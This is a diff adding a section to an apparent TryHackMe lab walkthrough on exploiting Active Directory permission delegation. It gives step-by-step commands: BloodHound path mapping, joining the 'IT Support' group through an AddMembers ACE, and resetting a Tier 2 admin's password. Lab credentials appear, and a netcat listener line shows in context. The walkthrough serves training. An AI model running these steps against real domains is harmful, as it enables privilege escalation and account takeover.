@@ -1249,3 +1249,67 @@ nc -lvnp 9001
 
 And run the exploit. See flag at `C:\hfs`!
 
+## Exploiting Active Directory
+
+Assuming we have connected to the network properly, let's get the credentials:
+
+```
+firefox distributor.za.tryhackme.loc/creds
+```
+
+> Your credentials have been generated: Username: justin.barnes Password: O8SMjhmo 
+
+And connect to the work box:
+
+```
+ssh za.tryhackme.loc\\justin.barnes@thmwrk1.za.tryhackme.loc
+```
+
+Active Directory (AD) supports Permission Delegation, allowing administrators to delegate specific rights to users or groups. While this helps manage large organizations efficiently, misconfigurations can lead to security vulnerabilities. One such vulnerability involves Access Control Entries (ACEs) within Discretionary Access Control Lists (DACLs), enabling attackers to escalate privileges.
+
+Let's start the `neo4j` console first:
+
+```
+sudo neo4j start
+```
+
+Make note of the localhost address it is assigned to. Then go to that address:
+
+```
+firefox localhost:7474
+```
+
+Login with default credentials `neo4j:neo4j` and change the password. Make sure to choose `bolt://` schema. 
+
+Then run bloodhound and log in with new password:
+
+```
+bloodhound --no-sandbox
+```
+
+Once `bloodhound` is running, click __Upload Data__ and locate the zip file from the task. Search for your user (`justin.barnes` in this case) and set it as a __Starting node__. Then search for _Tier 2 Admins_ and set it as an __Ending node__.
+
+Since Domain Users have the AddMembers ACE on IT Support, we can join the group. On THMWRK1:
+
+```powershell
+Add-ADGroupMember "IT Support" -Members "justin.barnes"
+```
+
+Now verify the changes:
+
+```powershell
+Get-ADGroupMember -Identity "IT Support"
+```
+
+Your user should be there. Now, find an admin account to target:
+
+```powershell
+Get-ADGroupMember -Identity "Tier 2 Admins"
+```
+
+I choose `t2_melanie.davies`. Let's reset her password (as a member of __IT Support__ we can reset passwords of Tier 2 Admins):
+
+```powershell
+$Password = ConvertTo-SecureString "SuperEasyPass123!@#" -AsPlainText -Force
+Set-ADAccountPassword -Identity "t2_melanie.davies" -Reset -NewPassword $Password
+```
